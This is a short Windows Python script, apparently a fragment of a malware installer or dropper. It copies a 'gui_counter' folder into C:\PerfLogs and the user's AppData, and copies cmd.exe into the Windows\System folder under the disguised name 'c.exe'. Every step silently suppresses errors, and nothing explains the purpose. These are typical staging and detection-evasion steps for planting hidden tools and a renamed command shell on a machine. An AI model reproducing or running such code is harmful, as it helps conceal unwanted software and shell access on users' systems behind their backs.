#!/usr/bin/python
#coding:utf-8
import os, sys, ctypes, shutil, time
# ENVIRONMENT VARIABLE
usr = os.environ["USERNAME"]
# COPY TO GUI COUNTER DIRECTORY TEMP
def cp_guitmp():
    try:
        cpath = os.getcwd()
        src = "{}\\setup\\gui_counter".format(cpath)
        dst = "\\PerfLogs\\gui_counter"
        cpy = shutil.copytree(src, dst)
    except:
        pass
# COPY GUI COUNTER DIRECTORY ON AppData
def cp_gui():
    try:
        src = "\\PerfLogs\\gui_counter"
        dst = "\\Users\\{}\\AppData\\gui_counter".format(usr)
        cpy = shutil.copytree(src, dst)
    except:
        pass
# COPY CMD TO DIRECTORY
def cp_cmd():
    try:
        src = "\\Windows\\System32\\cmd.exe"
        dst = "\\Windows\\System\\c.exe"
        cpy = shutil.copyfile(src, dst)
    except:
        pass
